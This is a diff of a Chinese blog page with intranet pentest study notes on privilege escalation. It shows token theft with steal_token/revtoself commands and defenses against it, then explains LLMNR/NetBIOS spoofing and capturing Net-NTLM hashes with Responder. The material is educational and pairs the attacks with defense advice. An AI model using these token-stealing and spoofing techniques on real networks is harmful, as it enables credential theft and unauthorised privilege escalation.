+<p>使用<code>pth&lt;ID&gt;</code>命令（这里的ID就是<code>creds</code> 下的<code> CredID</code> ），窃取身份令牌。</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220131210226622.png" alt="image-20220131210226622"></p>
+<p>使用 <code>ps </code>命令查看当前是否有域用户的进程正在运行，当前存在域用户的进程。选择名称为 <code>exploere</code>、<code>PID</code> 为 2496 的进程:</p>
+<p><img src="https://gitee.com/JIFENGJIANHAO1/images/raw/master/image-20220131210758443.png" alt="image-20220131210758443"></p>
+<pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 获取这个令牌</span>
+steal_token 
+<span class="hljs-meta">#</span><span class="bash"> 恢复令牌的权限</span>
+revtoself</code></pre>
+
+
+
+<h3 id="4-5-5-针对令牌窃取提权的防御分析"><a href="#4-5-5-针对令牌窃取提权的防御分析" class="headerlink" title="4.5.5 针对令牌窃取提权的防御分析"></a>4.5.5 针对令牌窃取提权的防御分析</h3><p>针对令牌窃取提权的防御措施如下。</p>
+<ul>
+<li>及时安装微软推送的补丁。</li>
+<li>对来路不明的或者有危险的软件，既不要在系统中使用，也不要在虚拟机中使用。</li>
+<li>对令牌的时效性进行限制，以防止散列值被破解后泄露有效的令牌信息。越敏感的数据，其令牌时效应该越短。如果每个操作都使用独立的令牌，就可以比较容易地定位泄露令牌的操作或环节。</li>
+<li>对于令牌，应采取加密存储及多重验证保护。</li>
+<li>使用加密链路<code>SSL/TLS</code>传输令牌，以防止被中间人窃听。</li>
+</ul>
+<h2 id="4-6-无凭证条件下的权限分析及防范"><a href="#4-6-无凭证条件下的权限分析及防范" class="headerlink" title="4.6 无凭证条件下的权限分析及防范"></a>4.6 无凭证条件下的权限分析及防范</h2><p>​        在本节的实验中，假设已经进人目标网络，但没有获得任何凭证，使用<code>LLMNR</code> 和 <code>NetBIOS</code> 欺骗攻击对目标网络进行渗透测试。</p>
+<h3 id="4-6-1-LLMNR-和NetBIOS欺骗攻击的基本概念"><a href="#4-6-1-LLMNR-和NetBIOS欺骗攻击的基本概念" class="headerlink" title="4.6.1 LLMNR 和NetBIOS欺骗攻击的基本概念"></a>4.6.1 <code>LLMNR</code> 和<code>NetBIOS</code>欺骗攻击的基本概念</h3><h5 id="1-LLMNR"><a href="#1-LLMNR" class="headerlink" title="1.  LLMNR"></a>1.  <code>LLMNR</code></h5><p>​        本地链路多播名称解析（<code>LLMNR</code>）是一种域名系统数据包格式。当局域网中的 <code>DNS</code> 服务器不可用时，<code>DNS</code>客户端会使用<code>LLMNR</code>解析本地网段中机器的名称，直到<code>DNS</code>服务器恢复正常为止。从 <code>Windows Vista</code> 版本开始支持 <code>LLMNR</code>。<code>LLMNR</code> 支持 <code>IPv6</code>。</p>
+<p><code>LLMNR</code> 的工作流程如下。</p>
+<ol>
+<li><code>DNS</code> 客户端在自己的内部名称缓存中查询名称。</li>
+<li>如果没有找到，主机将向主<code>DNS</code>发送名称查询请求。</li>
+<li>如果主<code>DNS</code>没有回应或者收到了错误的信息，主机会向备<code>DNS</code>发送查询请求。</li>
+<li>如果备<code>DNS</code>没有回应或者收到了错误的信息，将使用<code>LLMNR</code>进行解析。</li>
+<li>主机通过 <code>UDP</code> 协议向组播地址 <code>224.0.0.252</code> 的 <code>5355</code> 端口发送多播查询请求，以获取主机名所对应的 <code>IP</code> 地址。查询范围仅限于本地子网。</li>
+<li>本地子网中所有支持 <code>LLMNR</code> 的主机在收到查询请求后，会对比自己的主机名。如果不同，就丢弃；如果相同，就向查询主机发送包含自己 <code>IP</code> 地址的单播信息。</li>
+</ol>
+<h4 id="2-NetBIOS"><a href="#2-NetBIOS" class="headerlink" title="2.NetBIOS"></a>2.<code>NetBIOS</code></h4><p>​        <code>NetBIOS</code>是一种网络协议，一般用在由十几台计算机组成的局域网中（根据<code>NetBIOS</code>协议广播获得计算机名称，并将其解析为相应的 <code>IP</code> 地址）。在 <code>Windows NT</code> 以后版本的所有操作系统中均可使用<code>NetBIOS</code>。但是，<code>NetBIOS</code>不支持<code>IPv6</code>。</p>
+<p><code>NetBIOS</code>提供的三种服务如下：</p>
+<ul>
+<li><code>NetBIOS-NS</code>（名称服务）：主要用于名称注册和解析，以启动会话和分发数据报。该服务需要使用域名服务器来注册<code>NetBIOS</code>的名称。默认监听<code>UDP</code> 137端口，也可以使用<code>TCP</code> 137 端口。</li>
+<li><code>Datagram Distribution Service</code>（数据报分发服务）：无连接服务。该服务负责进行错误检测和恢复，默认监听 <code>UDP</code> 138 端口。</li>
+<li><code>Session Service</code>（会话服务）：允许两台计算机建立连接，允许电子邮件跨越多个数据包进行传输，提供错误检测和恢复机制。默认使用<code>TCP</code> 139端口。</li>
+</ul>
+<h4 id="3-Net-NTLM-Hash"><a href="#3-Net-NTLM-Hash" class="headerlink" title="3. Net-NTLM Hash"></a>3. <code>Net-NTLM Hash</code></h4><p>​        <code>Net-NTLM Hash</code> 与<code>NTLM Hash</code>不同。<br>​        <code>NTLM Hash</code>是指<code>Windows</code>操作系统的<code>Security Account Manager </code>中保存的用户密码散列值。<code>NTLM Hash</code>通常保存在<code>Windows</code>的<code>SAM</code>文件或者<code>NTDS.DIT</code>数据库中，用于对访问资源的用户进行身份验证。</p>
+<p>​        <code>Net-NTLM Hash</code> 是指在网络环境中经过 <code>NTLM</code> 认证的散列值。挑战/响应验证中的“<strong>响应</strong>”就包含<code>Net-NTLM Hash</code>。使用<code>Responder</code>抓取的通常就是<code>Net-NTLM Hash</code>。攻击者无法使用该散列值进行哈希传递攻击，只能在使用<code>Hashcat</code>等工具得到明文后进行横向移动攻击。</p>
+<h3 id="4-6-2-LLMNR和NetBIOS欺骗攻击分析"><a href="#4-6-2-LLMNR和NetBIOS欺骗攻击分析" class="headerlink" title="4.6.2 LLMNR和NetBIOS欺骗攻击分析"></a>4.6.2 <code>LLMNR</code>和<code>NetBIOS</code>欺骗攻击分析</h3><p>​        假设目标网络的<code>DNS</code>服务器因发生故障而无法提供服务时，会退回<code>LLMNR</code>和<code>NBT-NS</code>进行计算机名解析。下面使用<code>Responder</code>工具进行渗透测试。<code>Responder</code>是监听<code>LLMNR</code>和<code>NBT-NS</code>协议的工具之一，能够抓取网络中所有的<code>LLMNR</code>和<code>NBT-NS</code>请求并进行响应，获取最初的账户凭证。<code>Responder</code>可以利用内置<code>SMB</code>认证服务器、<code>MSSQL</code>认证服务器、<code>HTTP</code>认证服务器、<code>HTTPS</code>认证服务器、<code>LDAP</code> 认证服务器、<code>DNS</code>服务器、<code>WPAD</code> 代理服务器，以及 <code>FTP</code>、<code>POP3</code>、<code>IMAP</code>、<code>SMTP</code> 等服务器，收集目标网络中计算机的凭据，还可以通过 <code>Multi-Relay</code> 功能在目标系统中执行命令。</p>
+<h5 id="1-下载和运行"><a href="#1-下载和运行" class="headerlink" title="1.下载和运行"></a>1.下载和运行</h5><p><code>Responder</code>是使用<code>Python</code>语言编写的，<code>repo</code>：</p>
+<h5 id="2-监听模式"><a href="#2-监听模式" class="headerlink" title="2. 监听模式"></a>2. 监听模式</h5><p>进人目标网络后，如果没有获得任何目标系统的相关信息和重要凭证，可以开启 <code>Responder</code> 的监听模式。<code>Responder</code> 只会对网络中的流量进行分析，不会主动响应任何请求。使用<code>Responder</code>查看网络是如何在没有主动定位任何主机的情况下运行的，如图所示。</p>
+<p><code>ON</code>代表针对该服务数据包的监听，<code>OFF</code>代表关闭监听。由此可以分析出网络中存在的<code>IP</code>地址段、机器名等。</p>
+<h5 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3. 渗透测试"></a>3. 渗透测试</h5><p>​        在使用 <code>Responder</code> 对网络进行分析之后，可以利用<code>SMB</code>协议获取目标网络中计算机的<code>Net-NTLM Hash</code>。如果用户输入了错误的计算机名，在<code>DNS</code>服务器上进行的名称查询操作将会失败，名称解析请求将被退回，使用<code>NBT-NS</code>和<code>LLMNR</code>进行解析。</p>
+<p>​        在渗透测试中，使用<code>Responder</code>并启动回应请求功能，<code>Responder</code>会自动回应客户端的请求并声明自己就是被输入了错误计算机名的那台机器,然后尝试建立<code>SMB</code>连接。客户端会发送自己的 <code>Net-NTLM Hash</code> 进行身份验证，此时将得到目标机器的 <code>Net-NTLM Hash</code>，如图所示。</p>
+
         </div>
 
     </div>
@@ -879,15 +1139,15 @@ execute</code></pre>
     <section class="share">
         <div class="share-title">分享</div>
         <a class="share-item" target="_blank"
-            href="https://twitter.com/share?text=内网学习笔记四-权限提升分析及防御 - RainMaker&url=http://hasaki-h2.github.io/401ba385.html">
+            href="https://twitter.com/share?text=内网学习笔记四 | 权限提升分析及防御 - RainMaker&url=http://hasaki-h2.github.io/401ba385.html">
             <box-icon type='logo' name='twitter'></box-icon>
         </a>
         <a class="share-item" target="_blank"
-            href="https://www.facebook.com/sharer.php?title=内网学习笔记四-权限提升分析及防御 - RainMaker&u=http://hasaki-h2.github.io/401ba385.html">
+            href="https://www.facebook.com/sharer.php?title=内网学习笔记四 | 权限提升分析及防御 - RainMaker&u=http://hasaki-h2.github.io/401ba385.html">
             <box-icon name='facebook-square' type='logo' ></box-icon>
         </a>
         <!-- <a class="share-item" target="_blank"
-            href="https://service.weibo.com/share/share.php?title=内网学习笔记四-权限提升分析及防御 - RainMaker&url=http://hasaki-h2.github.io/401ba385.html&pic=">
+            href="https://service.weibo.com/share/share.php?title=内网学习笔记四 | 权限提升分析及防御 - RainMaker&url=http://hasaki-h2.github.io/401ba385.html&pic=">
             <div class="n-icon n-icon-weibo"></div>
         </a> -->
     </section>
@@ -972,7 +1232,7 @@ execute</code></pre>
           </li>
         
           <li>
-            <a href="/401ba385.html">内网学习笔记四-权限提升分析及防御</a>
+            <a href="/401ba385.html">内网学习笔记四 | 权限提升分析及防御</a>
           </li>
         
           <li>
